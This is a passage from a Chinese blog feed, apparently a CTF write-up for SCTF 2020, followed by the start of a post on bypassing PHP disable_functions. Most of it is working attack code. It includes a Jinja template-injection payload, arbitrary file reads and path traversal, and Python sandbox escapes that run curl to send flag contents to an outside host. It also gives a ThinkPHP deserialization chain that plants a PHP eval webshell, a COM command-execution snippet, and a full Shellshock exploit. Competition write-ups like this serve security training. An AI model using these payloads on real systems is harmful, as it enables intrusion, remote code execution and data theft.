data[&quot;symbols&quot;]    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)</code></pre><p>最后的payload:</p><pre><code class="python">import requestsimport base64import jsonnum1=1num2=2symbols=&quot;-{{''.__class__.__mro__[1].__subclasses__()[409]('/readflag',shell=True,stdout=-1).communicate()}}-&quot;data={    &quot;num1&quot;:num1,    &quot;num2&quot;:num2,    &quot;symbols&quot;:symbols}payload=json.dumps(data).replace(&quot;{{","\\u007b\\u007b").replace("}}&quot;,&quot;\\u007d\\u007d&quot;)payload=base64.b64encode(payload)print(payload)burp0_url = &quot;http://39.104.19.182:80/home/&quot;burp0_cookies = {&quot;sessionid&quot;: &quot;bd63u3ewjx05tc7ajvlkve7b9cu8h4kx&quot;, &quot;csrftoken&quot;: &quot;GBW7niMYrwP9fMP6jpgHN1ujcxEwuRQ4tMKdBDdnZvSlDny51S1K1cMmWtOsR0gO&quot;}burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://39.104.19.182&quot;, &quot;Referer&quot;: &quot;http://39.104.19.182/home/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}burp0_json={&quot;token&quot;: &quot;3ad9af405504233188f694a11ff22115&quot;, &quot;url&quot;: &quot;http://39.104.19.182//127.0.0.1:8000/rpc?url=http://127.0.0.1:5000/caculator&amp;methods=POST&amp;data={payload}&quot;.format(payload=payload)}print(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json).text)</code></pre><p><code>SCTF{2b19246757c63738e7c40bbdf87c3be1}</code></p><h2 id="Can-you-hear"><a href="#Can-you-hear" class="headerlink" title="Can you hear"></a>Can you hear</h2><p>We used the receiver to receive the information from the space station and tried to unlock the answer😀.</p><p>搜索 “空间站” “接收机” 信息 音频 等关键字找到<br><a href="https://zhuanlan.zhihu.com/p/98103018" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98103018</a><br><a href="https://www.sohu.com/a/159552694_610733" target="_blank" rel="noopener">https://www.sohu.com/a/159552694_610733</a><br>SSTV关键字</p><p><a href="https://zhuanlan.zhihu.com/p/105460358" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/105460358</a><br><a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04" target="_blank" rel="noopener">https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04</a></p><p>下载 mmsstv<br>修改录音设备为立体声混音<br>具体操作为：Option-&gt;Soundcard input level<br>播放音频得到flag:</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200704145700.png" alt="image5949"><br>SCTF{f78fsd1423fvsa}</p><h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>app.js</p><pre><code class="javascript=">HTTP/1.1 200 OKContent-Disposition: attachment; filename=&quot;dc62d163f53ce13369ab97041706060c&quot;Content-Length: 1547Last-Modified: Sat, 04 Jul 2020 05:14:45 GMTCache-Control: max-age=0Content-Type: application/octet-streamDate: Sat, 04 Jul 2020 05:14:50 GMTConnection: closeconst fs = require(&#39;fs&#39;);const path = require(&#39;path&#39;);const crypto = require(&#39;crypto&#39;);const Koa = require(&#39;koa&#39;);const Router = require(&#39;koa-router&#39;);const koaBody = require(&#39;koa-body&#39;);const send = require(&#39;koa-send&#39;);const app = new Koa();const router = new Router();const SECRET = &quot;03229a6694e657077f218c322f3e0bea&quot;app.use(koaBody({  multipart: true,  formidable: {      maxFileSize: 2000 * 1024 * 1024   }}));router.post(&#39;/uploadfile&#39;, async (ctx, next) =&gt; {  const file = ctx.request.body.files.file;  if (!fs.existsSync(file.path)) {    return ctx.body = &quot;Error&quot;;  }  if(file.path.toString().search(&quot;/fd/&quot;) != -1){    file.path=&quot;/dev/null&quot;  }  const reader = fs.createReadStream(file.path);  let fileId = crypto.createHash(&#39;md5&#39;).update(file.name + Date.now() + SECRET).digest(&quot;hex&quot;);  let filePath = path.join(__dirname, &#39;upload/&#39;) + fileId  const upStream = fs.createWriteStream(filePath);  reader.pipe(upStream)  return ctx.body = &quot;Upload success ~, your fileId is hereï¼&quot; + fileId;});router.get(&#39;/downloadfile/:fileId&#39;, async (ctx, next) =&gt; {  let fileId = ctx.params.fileId;  ctx.attachment(fileId);  try {    await send(ctx, fileId, { root: __dirname + &#39;/upload&#39; });  }catch(e){    return ctx.body = &quot;SCTF{no_such_file_~}&quot;  }});router.get(&#39;/&#39;, async (ctx, next) =&gt; {  ctx.response.type = &#39;html&#39;;  ctx.response.body = fs.createReadStream(&#39;index.html&#39;);});app.use(router.routes());app.listen(3333, () =&gt; {  console.log(&#39;This server is running at http://localhost:&#39; + 3333)})</code></pre><p>因为koa中访问参数也是ctx.request.body.xxxx 所以我们可以构造</p><pre><code>POST /uploadfile HTTP/1.1Host: 127.0.0.1:3333Content-Length: 77User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Content-Type: application/jsonAccept: */*Origin: http://127.0.0.1:3333Referer: http://127.0.0.1:3333/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: close{&quot;files&quot;:{&quot;file&quot;:{&quot;path&quot;:&quot;flag&quot;}}}</code></pre><p>来进行任意文件读取</p><p>SCTF{47cf9489d8832e44312dssxag6f88f45736e0e9c8}</p><h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><pre><code class="php=">Route::get(&#39;/&#39;,&quot;IndexController@init&quot;);Route::post(&#39;/rm&#39;,&quot;IndexController@rm&quot;);Route::get(&#39;/tmp/{filename}&#39;, function ($filename) {    readfile(&quot;./var/tmp/&quot;.$filename);})-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);Route::post(&#39;/upload&#39;,&quot;IndexController@upload&quot;);Route::get(&#39;/move/log/{filename}&#39;, &#39;IndexController@moveLog&#39;)-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);</code></pre><pre><code class="php=">&lt;?phpnamespace App\Http\Controllers;class IndexController extends Controller{    public function init(){        if($_SERVER[&quot;REMOTE_ADDR&quot;] !== &quot;127.0.0.1&quot; &amp;&amp; strpos($_SERVER[&quot;REMOTE_ADDR&quot;],&quot;192.168.&quot;) !== 0 &amp;&amp; strpos($_SERVER[&quot;REMOTE_ADDR&quot;],&quot;10.&quot;) !== 0 )  {            die(&quot;admin only&quot;);        }        if(!file_exists(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]))){            mkdir(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]));        }    }    public function rm(){        if(strpos($_POST[&quot;filename&quot;], &#39;../&#39;) !== false) die(&quot;???&quot;);        if(file_exists(&quot;/var/&quot;.$_POST[&quot;filename&quot;])){            if(is_dir(&quot;/var/&quot;.$_POST[&quot;filename&quot;])){                rmdir(&quot;/var/&quot;.$_POST[&quot;filename&quot;]);                echo &quot;rmdir&quot;;            }            else{                unlink(&quot;/var/&quot;.$_POST[&quot;filename&quot;]);                echo &quot;unlink&quot;;            }        }    }    public function upload()    {        if(strpos($_POST[&quot;filename&quot;], &#39;../&#39;) !== false) die(&quot;???&quot;);        file_put_contents(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/&quot;.$_POST[&quot;filename&quot;],base64_decode($_POST[&quot;content&quot;]));        echo &quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/&quot;.$_POST[&quot;filename&quot;];    }    public function moveLog($filename)    {        $data =date(&quot;Y-m-d&quot;);        if(!file_exists(storage_path(&quot;logs&quot;).&quot;/&quot;.$data)){            mkdir(storage_path(&quot;logs&quot;).&quot;/&quot;.$data);        }        $opts = array(            &#39;http&#39;=&gt;array(                &#39;method&#39;=&gt;&quot;GET&quot;,                &#39;timeout&#39;=&gt;1,//单位秒            )        );        $content = file_get_contents(&quot;http://127.0.0.1/tmp/&quot;.md5(&#39;127.0.0.1&#39;).&quot;/&quot;.$filename,false,stream_context_create($opts));        file_put_contents(storage_path(&quot;logs&quot;).&quot;/&quot;.$data.&quot;/&quot;.$filename,$content);        echo storage_path(&quot;logs&quot;).&quot;/&quot;.$data.&quot;/&quot;.$filename;    }}</code></pre><p>storage_path(“logs”):/var/www/html/storage/logs</p><p>upload dir : /var/tmp/md5(IP)/</p><pre><code class="php=">Route::get(&#39;/tmp/{filename}&#39;, function ($filename) {    readfile(&quot;./var/tmp/&quot;.$filename);})-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);</code></pre><p>直接任意文件读取，但是因为两个../服务器不会解析直接报错的原因无法穿到根目录，后来想到在弄个index.php就好了<br>最后的payload:<a href="http://39.104.93.188/index.php/tmp/../../flag" target="_blank" rel="noopener">http://39.104.93.188/index.php/tmp/../../flag</a></p><p>SCTF{B3st_1angu4g3_F0r_Uohhhhhhhhhh1l1l1}</p><h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><h3 id="pysandbox1"><a href="#pysandbox1" class="headerlink" title="pysandbox1"></a>pysandbox1</h3><p>app.py</p><pre><code class="python=">from flask import Flask, requestapp = Flask(__name__)@app.route(&#39;/&#39;, methods=[&quot;POST&quot;])def security():    secret = request.form[&quot;cmd&quot;]    for i in secret:        if not 42 &lt;= ord(i) &lt;= 122: return &quot;error!&quot;    exec(secret)    return &quot;xXXxXXx&quot;if __name__ == &#39;__main__&#39;:    app.run(host=&quot;0.0.0.0&quot;)</code></pre><p>测试环境：<a href="http://ccreater.top:60011/" target="_blank" rel="noopener">http://ccreater.top:60011/</a><br>禁用字符：</p><p><code>[&quot;\u0000&quot;, &quot;\u0001&quot;, &quot;\u0002&quot;, &quot;\u0003&quot;, &quot;\u0004&quot;, &quot;\u0005&quot;, &quot;\u0006&quot;, &quot;\u0007&quot;, &quot;\b&quot;, &quot;\t&quot;, &quot;\n&quot;, &quot;\u000b&quot;, &quot;\f&quot;, &quot;\r&quot;, &quot;\u000e&quot;, &quot;\u000f&quot;, &quot;\u0010&quot;, &quot;\u0011&quot;, &quot;\u0012&quot;, &quot;\u0013&quot;, &quot;\u0014&quot;, &quot;\u0015&quot;, &quot;\u0016&quot;, &quot;\u0017&quot;, &quot;\u0018&quot;, &quot;\u0019&quot;, &quot;\u001a&quot;, &quot;\u001b&quot;, &quot;\u001c&quot;, &quot;\u001d&quot;, &quot;\u001e&quot;, &quot;\u001f&quot;, &quot; &quot;, &quot;!&quot;, &quot;\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#39;&quot;, &quot;(&quot;, &quot;)&quot;, &quot;{&quot;, &quot;|&quot;, &quot;}&quot;, &quot;~&quot;, &quot;\u007f&quot;]</code></p><p>利用魔术方法? : <code>__getitem__,__getattr__</code></p><p>payload:</p><pre><code>POST /?a=__import__(&#39;os&#39;).system(&#39;curl+http%3a//ccreater.top%3a60000/+-d+`cat+flag|base64`&#39;) HTTP/1.1Host: 39.104.90.30:10006Pragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: image/webp,image/apng,image/*,*/*;q=0.8Referer: http://39.104.90.30:10006/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5bContent-Length: 248------WebKitFormBoundaryx3B8HB5bContent-Disposition: form-data; name=&quot;cmd&quot;request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;------WebKitFormBoundaryx3B8HB5b--</code></pre><h3 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h3><p>payload:</p><pre><code>POST /?a=__import__(&#39;os&#39;).system(&#39;curl+http%3a//ccreater.top%3a60000/+-d+`/readflag|base64`&#39;) HTTP/1.1Host: 39.104.90.30:10006Pragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: image/webp,image/apng,image/*,*/*;q=0.8Referer: http://39.104.90.30:10006/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5bContent-Length: 248------WebKitFormBoundaryx3B8HB5bContent-Disposition: form-data; name=&quot;cmd&quot;request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;------WebKitFormBoundaryx3B8HB5b--</code></pre><h3 id="为何payload能运行"><a href="#为何payload能运行" class="headerlink" title="为何payload能运行"></a>为何payload能运行</h3><p>我们都知道python 调用类方法的时候会传入<code>self</code>参数，而我们调用<code>app.config==request.args.a</code>应该也会传入self参数，那么为什么这个payload可以成功</p><p>测试代码</p><pre><code class="python">class A():    passa = A()a.__class__.__eq__=evala==&quot;print(123)&quot;</code></pre><p>我们跟进python底层看看</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165243.png" alt="image13796"></p><p>这里显示nargs显示只有1个参数，参看堆栈，跟踪到最开始的地方</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165459.png" alt="image13916"></p><p>这里我们确实传入了self,其中v是<code>self</code>,w是<code>print(123)</code></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165709.png" alt="image14041"></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165753.png" alt="image14125"></p><p>在<code>call_unbound</code>处我们发现了原因，是因为ubound==0</p><p>在<code>lookup_maybe_method</code>中设置了ubound的值</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708170013.png" alt="image14285"></p><p><code>#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</code></p><blockquote><p>The difference between bound and unbound is the value of the <code>.__self__</code> attribute (None when unbound). </p></blockquote><h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p>ThinkPHP V5.0.24</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/SWI66DGX_8Z2Z%7E_%5DOS1M%60W9.jpg" alt="image14584"></p><pre><code>http://39.99.41.124/public/log.txthttp://39.99.41.124/public/test/http://39.99.41.124/public/nationalsb/login.php</code></pre><p>在<a href="http://39.99.41.124/public/nationalsb/js/script.js中发现账号密码：" target="_blank" rel="noopener">http://39.99.41.124/public/nationalsb/js/script.js中发现账号密码：</a></p><pre><code>    //username:Admin1964752    //password:DsaPPPP!@#amspe1221    //Secret **** is your birthday</code></pre><p>文件包含:</p><pre><code>POST /public/nationalsb/login.php HTTP/1.1Host: 39.99.41.124Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 16file=/etc/passwd</code></pre><pre><code>Warning&lt;/b&gt;:  include(): Failed opening &#39;php://filter/read=convert.base64-encode/resource=index.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in &lt;b&gt;/var/www/html/public/nationalsb/login.php</code></pre><pre><code>GET /public/index.php?s=/index/Index/hello&amp;s3cr3tk3y= HTTP/1.1Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=Host: 39.99.41.124Connection: close</code></pre><pre><code class="php=">&lt;?phpnamespace app\index\controller;class Index extends \think\Controller{  public function index(){      $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];    echo &quot;Warning&quot;.&quot;&lt;br/&gt;&quot;;    echo &quot;You IP: &quot;.$ip.&quot; has been recorded by the National Security Bureau.I will record it to ./log.txt, Please pay attention to your behavior&quot;;    echo &#39;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://127.0.0.1/public/test&quot;&gt;&#39;;    }  public function hello(){      unserialize(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));    echo(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));  }}</code></pre><p>/var/www/html/protect.py</p><pre><code class="python=">....</code></pre><pre><code class="php=">&lt;?phpnamespace think\cache\driver;class File {    protected $options = [];    protected $tag;    public function __construct() {    $this-&gt;tag = &#39;cjbtest&#39;;    $this-&gt;options = [        &#39;cache_subdir&#39;  =&gt; false,        &#39;prefix&#39;        =&gt; &#39;&#39;,        &#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&#39;, // 因为 static 目录有写权限        &#39;data_compress&#39; =&gt; false    ];    }}namespace think\session\driver;use think\cache\driver\File;class Memcached {    protected $handler;    function __construct() {    $this-&gt;handler=new File();    }}namespace think\console;use think\session\driver\Memcached;class Output {    protected $styles = [];    private $handle;    function __construct() {    $this-&gt;styles = [&quot;getAttr&quot;, &#39;info&#39;,             &#39;error&#39;,             &#39;comment&#39;,             &#39;question&#39;,             &#39;highlight&#39;,             &#39;warning&#39;];    $this-&gt;handle = new Memcached();    }}namespace think\db;use think\console\Output;class Query {    protected $model;    function __construct() {    $this-&gt;model = new Output();    }}namespace think\model\relation;use think\console\Output;use think\db\Query;class HasOne {    public $model;    protected $selfRelation;    protected $parent;    protected $query;    protected $bindAttr = [];    public function __construct() {    $this-&gt;query = new Query(&quot;xx&quot;, &#39;think\console\Output&#39;);    $this-&gt;model = false;    $this-&gt;selfRelation = false;    $this-&gt;bindAttr = [&quot;xx&quot; =&gt; &quot;xx&quot;];    }}namespace think\model;use think\console\Output;use think\model\relation\HasOne;abstract class Model {}class Pivot extends Model {    public $parent;    protected $append = [];    protected $data = [];    protected $error;    protected $model;    function __construct() {    $this-&gt;parent = new Output();    $this-&gt;error = new HasOne();    $this-&gt;model = &quot;test&quot;;    $this-&gt;append = [&quot;test&quot; =&gt; &quot;getError&quot;];    $this-&gt;data = [&quot;panrent&quot; =&gt; &quot;true&quot;];    }}namespace think\process\pipes;use think\model\Pivot;class Windows {    private $files = [];    public function __construct() {    $this-&gt;files=[new Pivot()];    }}$obj = new Windows();$payload = serialize($obj);echo base64_encode($payload);</code></pre><p>写文件到/tmp</p><pre><code class="python=">import requestsimport hashlibpayload=requests.get(&quot;http://127.0.0.1/cms/thinkphp/5.0.24/tp5/public/test.php&quot;).text.strip()burp0_url = &quot;http://8.208.102.48:80/public/index.php&quot;params={    &quot;s&quot;:&quot;/index/Index/hello&quot;,    &quot;s3cr3tk3y&quot;:payload}burp0_headers = {&quot;Authorization&quot;: &quot;Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=&quot;, &quot;Connection&quot;: &quot;close&quot;}res=requests.get(burp0_url, headers=burp0_headers ,params=params)print(res.text)print(requests.get(&quot;http://8.208.102.48:80/public/log.txt&quot;).text)</code></pre><pre><code>POST /public/nationalsb/login.php HTTP/1.1Host: 8.208.102.48Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 155file=php://filter/read=convert.base64-encode/resource=/tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b743f45ea3d60a1190e3f723595050ca2.php&amp;1=phpinfo();&amp;1=phpinfo();</code></pre><p>写到文件里的内容</p><pre><code>&lt;?php//000000000000 exit();?&gt;s:163:&quot;php://filter/write=convert.base64-encode/resource=../../../../../../../../../../../../../../../../tmp/filenamebfe3467e649d6d158c51b5b5494ca5a2.php&quot;;</code></pre><p>这里 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> 里面的方法已经不管用了，我们需要自己想出其他办法</p><p>这里我们用<code>php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=</code>来绕过死亡exit</p><pre><code class="php">    $backdoor = &#39;&lt;?php eval($_POST[1]);?&gt;&#39;;    $x = str_rot13(base64_encode($payload));    $payload = base64_decode(str_rot13(base64_encode($backdoor)));    assert(base64_decode($x) === $backdoor);</code></pre><p><code>$dieORexit --convert.base64-encode|string.rot13|convert.base64-decode--&gt; something else</code></p><p><code>$payload   --convert.base64-encode|string.rot13|convert.base64-decode--&gt; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;</code> </p><p>最后的payload:<br><code>&#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/t&#39;.urldecode(&quot;%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E&quot;)</code></p><pre><code>POST /public/nationalsb/login.php HTTP/1.1Host: 8.208.102.48Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 126file=%2ftmp%2ft%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E743f45ea3d60a1190e3f723595050ca2.php&amp;1=system(&#39;cat /flag&#39;);</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/07/07/sctf2020/">https://www.ccreater.top/2020/07/07/sctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass_disable_function_open_basedir</title>
      <link href="2020/06/30/bypass_disable_function_open_basedir/"/>
      <url>2020/06/30/bypass_disable_function_open_basedir/</url>
      
        <content type="html"><![CDATA[<h1 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h1><h2 id="危险函数-类"><a href="#危险函数-类" class="headerlink" title="危险函数/类"></a>危险函数/类</h2><pre><code>FFICOMexecassertevalsystemini_set/ini_alterputenvimap_openpcntl_execwin_shell_executedl</code></pre><h2 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h2><p>利用条件：</p><pre><code>extension=php_com_dotnet.dllcom.allow_dcom = truewshom.ocx 存在</code></pre><pre><code class="php">$command = $_GET[&#39;cmd&#39;];$wsh = new COM(&#39;WScript.shell&#39;); // 生成一个COM对象　Shell.Application也能$exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); //调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput;</code></pre><h2 id="GNU-Bash-环境变量远程命令执行漏洞-CVE-2014-6271"><a href="#GNU-Bash-环境变量远程命令执行漏洞-CVE-2014-6271" class="headerlink" title="GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271"></a>GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271</h2><blockquote><p>   被攻击的bash存在漏洞（版本小于等于4.3）<br>   攻击者可以控制环境变量<br>   新的bash进程被打开触发漏洞并执行命令</p></blockquote><p>利用php的mail函数:<a href="https://www.exploit-db.com/exploits/35146" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/35146</a> </p><p><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>4.3及之前的bash启动解析环境变量时未对边界进行严格的限制</p><p>“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。</p><p>bash函数的格式,调用函数只需变量名+参数即可<code>函数 参数1 参数2</code></p><pre><code class="bash">funtion ShellShock { echo &quot;Injection&quot;} ShellShock   #调用这个函数</code></pre><p>这个时候的Bash的环境变量：</p><pre><code>KEY = ShellShockVALUE = () { echo Injection; }</code></pre><p>来看看ShellShock漏洞的真身：</p><pre><code class="shell">export ShellShock=&#39;() { :; }; echo;/usr/bin/whoami&#39;bash&gt;Kr0iN</code></pre><p>看看环境变量你有什么<br><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1229"></p><pre><code class="bash">env x=&#39;() { :;}; echo Vulnerable CVE-2014-6271 &#39; bash -c &quot;echo test&quot;</code></pre><p><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1379"></p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="php的mail函数"><a href="#php的mail函数" class="headerlink" title="php的mail函数()"></a>php的mail函数()</h4><p>如果服务器的默认sh是bash,mail函数会生成一个bash进程,再结合putenv()利用破壳漏洞来实现任意命令执行</p><p>会生成bash进程除了mail,php函数还有imap_mail，如果你仅仅通过禁用mail函数来规避这个安全问题，那么imap_mail是可以做替代的。当然，php里还可能有其他地方有调用popen或其他能够派生bash子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。</p><p>更详细的解释:p牛的<a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">PHP Execute Command Bypass Disable_functions</a></p><pre><code class="php"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)# Google Dork: none# Date: 10/31/2014# Exploit Author: Ryan King (Starfall)# Vendor Homepage: http://php.net# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror# Version: 5.* (tested on 5.6.2)# Tested on: Debian 7 and CentOS 5 and 6# CVE: CVE-2014-6271&lt;pre&gt;&lt;?php echo &quot;Disabled functions: &quot;.ini_get(&#39;disable_functions&#39;).&quot;\n&quot;; ?&gt;&lt;?phpfunction shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283   if(strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) {     $tmp = tempnam(&quot;.&quot;,&quot;data&quot;);     putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;);     // In Safe Mode, the user may only alter environment variables whose names     // begin with the prefixes supplied by this directive.     // By default, users will only be able to set environment variables that     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,     // PHP will let the user modify ANY environment variable!     mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#39;t actually send any mail   }   else return &quot;Not vuln (not bash)&quot;;   $output = @file_get_contents($tmp);   @unlink($tmp);   if($output != &quot;&quot;) return $output;   else return &quot;No output, or not vuln.&quot;;}echo shellshock($_REQUEST[&quot;cmd&quot;]);?&gt;</code></pre><h2 